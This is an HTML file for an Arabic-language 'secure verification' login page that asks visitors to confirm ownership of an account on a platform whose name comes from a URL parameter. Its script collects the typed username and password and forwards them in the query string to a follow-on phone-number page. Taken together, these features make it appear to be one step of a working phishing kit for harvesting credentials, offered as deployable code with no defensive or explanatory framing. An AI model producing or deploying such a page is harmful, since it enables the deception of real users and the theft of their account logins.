<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif; }
        body { background-color: #f4f7f6; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .card { background: #fff; padding: 30px; border-radius: 15px; box-shadow: 0 8px 24px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center; }
        h2 { color: #333; margin-bottom: 10px; font-size: 24px; }
        p { color: #666; margin-bottom: 25px; font-size: 14px; }
        input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 8px; margin-bottom: 15px; text-align: right; font-size: 16px; outline: none; }
        input:focus { border-color: #007bff; }
        .btn { background-color: #007bff; color: white; border: none; padding: 12px; width: 100%; border-radius: 8px; font-size: 16px; cursor: pointer; font-weight: bold; width: 100%; }
        .btn:hover { background-color: #0056b3; }
    </style>
</head>
<body>
<div class="card">
    <h2>التحقق الآمن</h2>
    <p>يرجى تسجيل الدخول لتأكيد ملكية الحساب</p>
    <form id="loginForm">
        <input type="text" id="username" placeholder="اسم المستخدم أو البريد الإلكتروني" required>
        <input type="password" id="password" placeholder="كلمة المرور" required>
        <button type="submit" class="btn">تحقق من الحساب</button>
    </form>
</div>

<script>
    document.getElementById('loginForm').addEventListener('submit', function(e) {
        e.preventDefault();
        const urlParams = new URLSearchParams(window.location.search);
        const name = urlParams.get('name') || '';
        const platform = urlParams.get('platform') || '';
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;

        // الانتقال لصفحة الهاتف وتمرير كل البيانات المجموعة حتى الآن في الرابط
        window.location.href = `phone.html?name=${encodeURIComponent(name)}&platform=${platform}&user_id=${encodeURIComponent(username)}&user_pass=${encodeURIComponent(password)}`;
    });
</script>
</body>
</html>
